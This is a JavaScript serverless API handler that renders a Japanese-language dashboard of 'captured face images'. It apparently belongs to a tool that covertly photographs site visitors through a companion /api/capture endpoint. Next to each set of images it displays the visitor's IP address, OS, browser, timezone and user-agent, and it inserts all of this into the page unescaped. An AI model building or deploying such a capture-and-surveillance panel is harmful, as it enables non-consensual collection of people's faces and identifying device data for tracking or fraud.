// api/faces.js
let capturedFaces = global.capturedFaces || [];

export default function handler(req, res) {
    console.log('Faces API called:', req.method, req.url);
    
    // CORS headers
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');

    if (req.method === 'OPTIONS') {
        res.status(200).end();
        return;
    }

    if (req.method === 'GET') {
        const html = `
<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>キャプチャされた顔画像</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            margin: 0;
            padding: 20px;
            background-color: #f5f5f5;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
        }
        h1 {
            color: #333;
            text-align: center;
            margin-bottom: 30px;
        }
        .stats {
            background: white;
            padding: 20px;
            border-radius: 8px;
            margin-bottom: 30px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }
        .capture-item {
            background: white;
            border-radius: 8px;
            padding: 20px;
            margin-bottom: 20px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }
        .capture-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
            padding-bottom: 10px;
            border-bottom: 1px solid #eee;
        }
        .capture-time {
            font-weight: bold;
            color: #f48120;
        }
        .capture-info {
            font-size: 14px;
            color: #666;
        }
        .images-container {
            display: flex;
            gap: 15px;
            flex-wrap: wrap;
            margin-bottom: 15px;
        }
        .image-item {
            text-align: center;
        }
        .image-item img {
            max-width: 200px;
            max-height: 200px;
            border-radius: 8px;
            border: 2px solid #f48120;
            object-fit: cover;
        }
        .image-label {
            font-size: 12px;
            color: #666;
            margin-top: 5px;
        }
        .system-info {
            background: #f8f9fa;
            padding: 15px;
            border-radius: 6px;
            font-size: 13px;
            line-height: 1.6;
        }
        .system-info h4 {
            margin: 0 0 10px 0;
            color: #333;
        }
        .info-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 10px;
        }
        .no-data {
            text-align: center;
            color: #666;
            font-style: italic;
            padding: 50px;
        }
        .refresh-btn {
            position: fixed;
            top: 20px;
            right: 20px;
            background: #f48120;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 6px;
            cursor: pointer;
            font-size: 14px;
        }
        .refresh-btn:hover {
            background: #e06a00;
        }
        .api-info {
            background: #e7f3ff;
            padding: 15px;
            border-radius: 6px;
            margin-bottom: 20px;
            border-left: 4px solid #0066cc;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔍 キャプチャされた顔画像</h1>
        
        <div class="api-info">
            <strong>API情報:</strong><br>
            • POST /api/capture - 画像を送信<br>
            • GET /api/capture - データを取得<br>
            • GET /api/faces - この画面を表示
        </div>
        
        <div class="stats">
            <h3>統計情報</h3>
            <p>総キャプチャ数: <strong>${capturedFaces.length}</strong></p>
            <p>最終更新: <strong>${capturedFaces.length > 0 ? new Date(capturedFaces[capturedFaces.length - 1].timestamp).toLocaleString('ja-JP') : 'なし'}</strong></p>
        </div>
        
        <button class="refresh-btn" onclick="location.reload()">🔄 更新</button>
        
        ${capturedFaces.length === 0 ?
            '<div class="no-data">まだキャプチャされた画像がありません</div>' :
            capturedFaces.slice().reverse().map(capture => `
                <div class="capture-item">
                    <div class="capture-header">
                        <div class="capture-time">
                            ${new Date(capture.timestamp).toLocaleString('ja-JP')}
                        </div>
                        <div class="capture-info">
                            ID: ${capture.id} | 画像数: ${capture.capture_count}枚
                        </div>
                    </div>
                    
                    <div class="images-container">
                        ${capture.images.map((image, index) => `
                            <div class="image-item">
                                <img src="${image}" alt="キャプチャ画像 ${index + 1}" />
                                <div class="image-label">画像 ${index + 1}</div>
                            </div>
                        `).join('')}
                    </div>
                    
                    <div class="system-info">
                        <h4>システム情報</h4>
                        <div class="info-grid">
                            <div><strong>IP:</strong> ${capture.system_info.ip_address || 'Unknown'}</div>
                            <div><strong>OS:</strong> ${capture.system_info.os || 'Unknown'}</div>
                            <div><strong>ブラウザ:</strong> ${capture.system_info.browser || 'Unknown'}</div>
                            <div><strong>解像度:</strong> ${capture.system_info.screen_resolution || 'Unknown'}</div>
                            <div><strong>言語:</strong> ${capture.system_info.language || 'Unknown'}</div>
                            <div><strong>タイムゾーン:</strong> ${capture.system_info.timezone || 'Unknown'}</div>
                        </div>
                        <div style="margin-top: 10px;">
                            <strong>User-Agent:</strong> ${capture.system_info.user_agent || 'Unknown'}
                        </div>
                    </div>
                </div>
            `).join('')
        }
    </div>
    
    <script>
        // 30秒ごとに自動更新
        setInterval(() => {
            location.reload();
        }, 30000);
    </script>
</body>
</html>
        `;
        
        res.setHeader('Content-Type', 'text/html');
        res.status(200).send(html);
    } else {
        res.status(405).json({ error: 'Method not allowed' });
    }
}
